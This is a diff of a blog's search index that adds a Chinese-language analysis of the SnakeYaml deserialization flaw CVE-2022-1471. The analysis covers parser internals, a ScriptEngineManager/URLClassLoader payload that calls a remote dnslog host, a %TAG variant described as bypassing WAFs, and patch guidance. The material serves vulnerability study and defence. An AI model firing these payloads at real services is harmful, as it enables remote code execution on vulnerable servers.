-        <tag>CVE-2022-45690</tag>
-        <tag>CVE-2022-45689</tag>
-        <tag>DoS</tag>
+        <tag>FashJSON</tag>
       </tags>
   </entry>
   <entry>
@@ -381,6 +390,145 @@
         <tag>jetty</tag>
         <tag>axis2</tag>
         <tag>struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</title>
+    <url>/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/</url>
+    <content><![CDATA[<h1 id="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）"><a href="#SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）" class="headerlink" title="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）"></a>SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</h1><blockquote>
+<p>文字描述难免有所补足，请移步视频讲解：<a href="https://www.bilibili.com/video/BV1X14y1v71x/">SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</a></p>
+</blockquote>
+<h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>，支持所有YAML定义的类型。</p>
+<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>该漏洞源于程序在进行反序列化过程中未对用户输入内容做合法性验证，导致了恶意代码执行。</p>
+<span id="more"></span>
+
+<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>&lt;&#x3D; SnakeYaml 1.33</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入snakeyaml包</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>编写测试类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.constructor.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://i0hrz1.dnslog.cn\&quot;]]]]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在dnslog平台获取一个域名填到payload中，然后运行程序观察dnslog平台得域名解析情况，若有解析记录，则证明存在漏洞。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>本文我们不从漏洞手，而是首先了解以下snakeyaml时怎样进行反序列化的，观察在反序列化过程中都有哪些重要的步骤，反序列化过程中又是为何能够解析到我们提供的域名，进而能够进行远程类加载，执行恶意代码。首先我们需要打初始的断点：</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814161735123.png" alt="image-20230814161735123"></p>
+<p>虽然漏洞的触发入口时在load方法，但是我们首先需要关注的时yaml对象的初始化过程。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814161845728.png" alt="image-20230814161845728"></p>
+<p>从上图，yaml队形初始化过程中共计涉及到5个对象的构建</p>
+<table>
+<thead>
+<tr>
+<th>对象</th>
+<th>功用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Contructor</td>
+<td>对象构造器，负责JavaBean对象的构造</td>
+</tr>
+<tr>
+<td>Representer</td>
+<td>表示器，不知道有啥用，因为没有具体到它的方法，它在本漏洞中扮演的角色不是特别重要</td>
+</tr>
+<tr>
+<td>DumperOptions</td>
+<td>JavaBean对象序列化选项</td>
+</tr>
+<tr>
+<td>LoaderOptions</td>
+<td>yaml序列化数据反序列化配置选项，在漏洞修复版本中就是在该类中增加了新的反序列化选项来限制自定义的全局TAG</td>
+</tr>
+<tr>
+<td>Resolver</td>
+<td>分析器，具体作用定位不太好描述，另外还有个parser，和resolver解释很像，没太区分明白，当然仔细研究的话肯定还是可以区分。</td>
+</tr>
+</tbody></table>
+<p>load方法会调用loadFromReader从streamReader中加载对象，而streamReader其实又封装了stringReader对象，面向对象这层层封装还是挺恶心的。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814162654884.png" alt="image-20230814162654884"></p>
+<p>可以看到就是封装了一些元数据，包括数据窗口的大小，数据长度，数据流，流是否结束标志，缓冲区等，而在StringReader中也仅封装了字符串长度与字符串字面量而已。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814162937919.png" alt="image-20230814162937919"></p>
+<p>loadFromReader方法主要完成composer（构建器）的创建以及数据的构建。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814163122111.png" alt="image-20230814163122111"></p>
+<p>构建器里主要封装了解析器、分析器、反序列化配置、锚点、递归节点等数据。</p>
+<p>解析器里封装了扫描器，扫描器负责对序列化字符串进行逐个字符扫描以获取token、元素入口与出口、获取键与值、块入口与出口等。</p>
+<p>分析器主要负责通过数据内容来推测对应的数据类型，Yaml语法中主要包含三种数据类型即序列、映射与标量，所谓序列就是列表、数组类似的概念，映射可以理解为Python中的字典、Java中的Map，标量时Yaml中的最小的不可再分的基本数据类型，包括字符串、整数、浮点数、日期时间等类型。</p>
+<p>通过contrutor的getSingleData方法可以获得到一个type指定类型的对象。其首先需要调用composer的getSingleNode方法获取到一个Node对象，该Node对象时对我们传入的序列化数据的格式化解析与封装。然后电泳constructDocument方法通过Node对象获取最终的目标对象。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164251442.png" alt="image-20230814164251442"></p>
+<p>我们首先关注getSingleNode方法。进入该方法会首先通过解析器对事件进行配置</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164458986.png" alt="image-20230814164458986"></p>
+<p>可以看到获取事件时其实时同故宫state对象进行创建的，而state对象其实是一个Production接口的实例。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164703271.png" alt="image-20230814164703271"></p>
+<p>其有很多的实现类，分别对应不同的节点类型的不同处理阶段。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164959202.png" alt="image-20230814164959202"></p>
+<p>我们在初始化解析器的时候会初始化state对下个为ParseStreamStart的实例</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814165131638.png" alt="image-20230814165131638"></p>
+<p>故此处调用的produce方法即是<code>org.yaml.snakeyaml.parser.ParserImpl.ParseStreamStart#produce</code>，在该方法中获取了获取了流解析开始事件并重置了state为下一阶段的隐式文档解析开始状态。每一个事件中都包含两个重要的标志Mark，一个称之为startMark一个称之为endMark，分别标识了当前事件处理的开始与结束位置</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814165258362.png" alt="image-20230814165258362"></p>
+<p>在获取到事件后，判断事件是否为流结束事件，若不是则进入到节点解析逻辑。在此逻辑开始时会调用getEvent方法获取一个开始事件，待composeNode方法调用完毕后，再嗲用getEvent方法获取到一个结束事件，最后对锚点与记录的递归节点进行清理。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814170038625.png" alt="image-20230814170038625"></p>
+<p>在composeNode方法中主要有两个分支，如果你的序列化数据设置了锚点与别名此时会进入第一个分支，若没有则会进入到else分支，我们这里会进入到else分支。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814170426979.png" alt="image-20230814170426979"></p>
+<p>在else分支中还是首先会把事件往前推一次，获得的NodeEvent主要包含三种类型分别为ScalarNode SequenceNode MappingNode，即我们开始谈到的Yaml格式的三种类型标量、序列以及映射，很明显我们这里会进入到序列的处理逻辑里面。</p>
+<p>在composeSequenceNode方法中首先设置事件为SequenceStartEvent，即序列处理开始，然后会尝试获取Tag，关于tag的内容可以在<a href="https://yaml.org/spec/1.2.2/#tag-shorthands%E4%BA%86%E8%A7%A3%EF%BC%8C%E7%84%B6%E5%90%8E%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASequenceNode%E5%AF%B9%E8%B1%A1%EF%BC%8C%E5%9C%A8%E6%9E%84%E9%80%A0SequenceNode%E5%AF%B9%E8%B1%A1%E6%97%B6%E4%BC%9A%E5%B0%86children%E5%BD%93%E4%BD%9C%E5%8F%82%E6%95%B0%E4%BC%A0%E8%BF%9B%E5%8E%BB%E8%B5%8B%E5%80%BC%E7%BB%99%E5%B1%9E%E6%80%A7this.value%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9F%A5%E9%81%93ArrayList%E6%98%AF%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%EF%BC%8C%E8%8B%A5%E4%BB%A5%E5%A4%96%E7%A7%92%E5%AF%B9children%E7%9A%84%E4%BF%AE%E6%94%B9%E5%B0%86%E5%BD%B1%E5%93%8D%E5%88%B0SequenceNode%E4%B8%AD%E7%9A%84%E5%80%BC%E3%80%82%E7%84%B6%E5%90%8E%E5%97%B2%E7%94%A8composeNode%E6%96%B9%E6%B3%95%E7%BB%A7%E7%BB%AD%E8%BF%9B%E8%A1%8C%E8%8A%82%E7%82%B9%E5%90%8E%E8%A7%81%E5%B9%B6%E6%B7%BB%E5%8A%A0%E5%88%B0children%E4%B8%AD%E4%BD%9C%E4%B8%BASequenceNode%E7%9A%84%E5%AD%90%E8%8A%82%E7%82%B9%E3%80%82%E5%88%B0%E8%BF%99%E9%87%8C%E5%B0%B1%E5%B7%B2%E7%BB%8F%E5%BC%80%E5%A7%8B%E9%80%92%E5%BD%92%E8%A7%A3%E6%9E%90%E4%BA%86%EF%BC%8C%E7%9B%B4%E5%88%B0%E8%A7%A3%E6%9E%90%E5%88%B0StreamEnd%E3%80%82">https://yaml.org/spec/1.2.2/#tag-shorthands了解，然后创建一个SequenceNode对象，在构造SequenceNode对象时会将children当作参数传进去赋值给属性this.value，我们知道ArrayList是引用类型，若以外秒对children的修改将影响到SequenceNode中的值。然后嗲用composeNode方法继续进行节点后见并添加到children中作为SequenceNode的子节点。到这里就已经开始递归解析了，直到解析到StreamEnd。</a></p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814170947063.png" alt="image-20230814170947063"></p>
+<p>在获取到Node后，就进入到目标对象构建的流程中</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814172249327.png" alt="image-20230814172249327"></p>
+<p>在constructObject方法中还对获取到的node对象进行了缓存检查</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814172306770.png" alt="image-20230814172306770"></p>
+<p>在调用getConstructor时会首先从预设好的13中内置构造器中尝试选择，若没有匹配的则返回一个ConstructYamlObject的构造器，然后调用器ConstructYamlObject的getConstructor方法通过反射的方式获得目标类的Class实例，然后根据Node类型获取到不同的几点构造器，此处为ContructSequence</p>
+<p>然后调用器construct方法，该方法也时通过节点tag的不同类型选择不同的处理逻辑，这里会进入到可变对象的对象构建逻辑中。由下图，在这个逻辑中会首先获取当前Node的value属性，也就是子节点的尺寸然后与获得的目标类的构造方法的参数尺寸进行比较，若成功匹配则依次对直接点调用constructObjec递归构建对象然后作为父节点的构造方法参数传参同通过反射的方式进行实例化。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814173636570.png" alt="image-20230814173636570"></p>
+<p>在我们提供的payload中，也就是最终我们要构建的类是javax.script.ScriptEngineManager，构造该类调用的是其含有一个参数的有参构造方法，其参数为一个类加载器java.net.URLClassLoader，而在构造java.net.URLClassLoader时也是调用其含有一个参数的有参构造方法不过其参数时一个数组，所以我们会考到java.net.URLClassLoader后嵌套了两层[[，其数组类型为java.net.URL。我们知道URLClassLoader会从传入的URL进行远程的类加载工作，那么这个payload极有可能涉及到远程恶意类加载与实例化。那么ScriptEngineManager的构造方法又做了什么呢</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814174418936.png" alt="image-20230814174418936"></p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814174500741.png" alt="image-20230814174500741"></p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814174437825.png" alt="image-20230814174437825"></p>
+<p>可以看到这是一个很明显的SPI调用过程，我们只需要在远程部署一个实现了ScriptEngineFactory接口的类，并子啊其静态代码块中写入命令执行的代码，并在其Classpath:META-INFO&#x2F;services&#x2F;javax.script.ScriptEngineFactory文件中应用该实现类即可完成利用。具体的远程RCE可以上网自行寻找。</p>
+<p>在最新版的snake中该漏洞得到了修复，官方通过在loadConfigs对象中引入了新的配置项并且限制了反序列化递归调用嵌套深度的方式来对反序列化漏洞进行了限制。</p>
+<p>限制递归深度在org.yaml.snakeyaml.composer.Composer#increaseNestingDepth方法中检查，最大深度默认为50层</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814193403071.png" alt="image-20230814193403071"></p>
+<p>目标类类型检查在下图处检查，首先节点Tag是否是自定义的全局tag如果是则调用org.yaml.snakeyaml.inspector.TagInspector#isGlobalTagAllowed方法进行检查，TagInspector是一个接口，其默认实现是org.yaml.snakeyaml.inspector.UnTrustedTagInspector。isGlobalTagAllowed方法默认返回false，即不允许使用全局的Tag。</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814193503552.png" alt="image-20230814193503552"></p>
+<p>我们在编写代码的时候如果需要指定发序列化的目标类类型则必须要实现TagInspector接口，重写isGlobalTagAllowed方法，然后将其注入到LoaderOptions实例化对象中。</p>
+<p>默认不允许使用全局tag</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194127911.png" alt="image-20230814194127911"></p>
+<p>实现TagInspector接口，此处直接返回true，也可以在isGlobalTagAllowed方法中根据tag来进行逻辑判断决定允许哪些类能被反序列化。</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194330452.png" alt="image-20230814194330452"></p>
+<p>重写isGlobalTagAllowed方法后的结果</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194609615.png" alt="image-20230814194609615"></p>
+<p>远程类加载</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194851114.png" alt="image-20230814194851114"></p>
+<p>在分析的过程中我发现了一些好玩的地方，手下时除了load方法可以利用该payload外，如果我们使用的时loadAs方法被人制定了目标类的类型应该怎么办？</p>
+<p>当然如果类型不匹配，即ScriptEngineFactory如果不是目标类的子类或这实现类，就没得玩，但是如果是一些抽象级别比较高的类还是大有可为的，比如xxxx组件就是这么干的，嗯一个CVE到手了。</p>
+<p>两外我们可以利用Yaml语法中的TAG特性来实现WAF绕过，我们只需要对payload进行以下的变形</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">%TAG</span> <span class="type">!m</span><span class="string">!</span> <span class="string">tag:yaml.org,2002:java</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="type">!m!x.script.ScriptEngineManager</span> [<span class="type">!m!.net.URLClassLoader</span> [[<span class="type">!m!.net.URL</span> [<span class="string">&quot;http://i0hrz1.dnslog.cn&quot;</span>]]]]</span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>
+
+<p>依旧RCE，还可以用来绕WAF</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814195046711.png" alt="image-20230814195046711"></p>
+<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
+<li>升级软件到不受影响的版本或最新版，最新版maven仓库地址：<a href="https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1%E3%80%82">https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1。</a></li>
+<li>限制服务器出网</li>
+</ol>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471</a></li>
+<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2022-1471">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2022-1471</a></li>
+<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471</a></li>
+<li><a href="https://www.cnblogs.com/nice0e3/p/14514882.html">https://www.cnblogs.com/nice0e3/p/14514882.html</a></li>
+<li><a href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/">https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/</a></li>
+<li><a href="https://www.cnblogs.com/R0ser1/p/16213257.html">https://www.cnblogs.com/R0ser1/p/16213257.html</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
+        <tag>反序列化</tag>
+        <tag>网络安全</tag>
+        <tag>漏洞分析</tag>
+        <tag>漏洞</tag>
+        <tag>SnakeYaml</tag>
+        <tag>CVE-2022-1471</tag>
       </tags>
   </entry>
   <entry>
@@ -526,145 +674,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</title>
-    <url>/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/</url>
-    <content><![CDATA[<h1 id="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）"><a href="#SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）" class="headerlink" title="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）"></a>SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</h1><blockquote>
-<p>文字描述难免有所补足，请移步视频讲解：<a href="https://www.bilibili.com/video/BV1X14y1v71x/">SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</a></p>
-</blockquote>
-<h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>，支持所有YAML定义的类型。</p>
-<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>该漏洞源于程序在进行反序列化过程中未对用户输入内容做合法性验证，导致了恶意代码执行。</p>
-<span id="more"></span>
-
-<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>&lt;&#x3D; SnakeYaml 1.33</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入snakeyaml包</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>编写测试类</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.constructor.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://i0hrz1.dnslog.cn\&quot;]]]]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在dnslog平台获取一个域名填到payload中，然后运行程序观察dnslog平台得域名解析情况，若有解析记录，则证明存在漏洞。</p>
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>本文我们不从漏洞手，而是首先了解以下snakeyaml时怎样进行反序列化的，观察在反序列化过程中都有哪些重要的步骤，反序列化过程中又是为何能够解析到我们提供的域名，进而能够进行远程类加载，执行恶意代码。首先我们需要打初始的断点：</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814161735123.png" alt="image-20230814161735123"></p>
-<p>虽然漏洞的触发入口时在load方法，但是我们首先需要关注的时yaml对象的初始化过程。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814161845728.png" alt="image-20230814161845728"></p>
-<p>从上图，yaml队形初始化过程中共计涉及到5个对象的构建</p>
-<table>
-<thead>
-<tr>
-<th>对象</th>
-<th>功用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Contructor</td>
-<td>对象构造器，负责JavaBean对象的构造</td>
-</tr>
-<tr>
-<td>Representer</td>
-<td>表示器，不知道有啥用，因为没有具体到它的方法，它在本漏洞中扮演的角色不是特别重要</td>
-</tr>
-<tr>
-<td>DumperOptions</td>
-<td>JavaBean对象序列化选项</td>
-</tr>
-<tr>
-<td>LoaderOptions</td>
-<td>yaml序列化数据反序列化配置选项，在漏洞修复版本中就是在该类中增加了新的反序列化选项来限制自定义的全局TAG</td>
-</tr>
-<tr>
-<td>Resolver</td>
-<td>分析器，具体作用定位不太好描述，另外还有个parser，和resolver解释很像，没太区分明白，当然仔细研究的话肯定还是可以区分。</td>
-</tr>
-</tbody></table>
-<p>load方法会调用loadFromReader从streamReader中加载对象，而streamReader其实又封装了stringReader对象，面向对象这层层封装还是挺恶心的。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814162654884.png" alt="image-20230814162654884"></p>
-<p>可以看到就是封装了一些元数据，包括数据窗口的大小，数据长度，数据流，流是否结束标志，缓冲区等，而在StringReader中也仅封装了字符串长度与字符串字面量而已。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814162937919.png" alt="image-20230814162937919"></p>
-<p>loadFromReader方法主要完成composer（构建器）的创建以及数据的构建。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814163122111.png" alt="image-20230814163122111"></p>
-<p>构建器里主要封装了解析器、分析器、反序列化配置、锚点、递归节点等数据。</p>
-<p>解析器里封装了扫描器，扫描器负责对序列化字符串进行逐个字符扫描以获取token、元素入口与出口、获取键与值、块入口与出口等。</p>
-<p>分析器主要负责通过数据内容来推测对应的数据类型，Yaml语法中主要包含三种数据类型即序列、映射与标量，所谓序列就是列表、数组类似的概念，映射可以理解为Python中的字典、Java中的Map，标量时Yaml中的最小的不可再分的基本数据类型，包括字符串、整数、浮点数、日期时间等类型。</p>
-<p>通过contrutor的getSingleData方法可以获得到一个type指定类型的对象。其首先需要调用composer的getSingleNode方法获取到一个Node对象，该Node对象时对我们传入的序列化数据的格式化解析与封装。然后电泳constructDocument方法通过Node对象获取最终的目标对象。</p>
